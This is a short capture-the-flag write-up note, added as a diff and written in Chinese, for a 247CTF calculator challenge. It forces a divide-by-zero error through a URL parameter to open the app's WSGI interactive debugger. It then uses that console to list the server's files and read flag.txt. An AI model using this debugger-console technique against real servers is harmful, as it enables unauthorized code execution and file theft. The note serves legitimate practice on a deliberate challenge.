@@ -1,0 +1,8 @@
+https://921bda085c4d9759.247ctf.com/calculator?number_1=1&number_2=0&operation=%2f
+用除零引发异常，然后在异常的WSGI debugger中使用交互式调试：
+[console ready]
+>>> os.listdir()
+['flag.txt', 'run.py']
+>>> f = open('flag.txt','r')
+>>> contents = f.read()
+>>> print (contents)
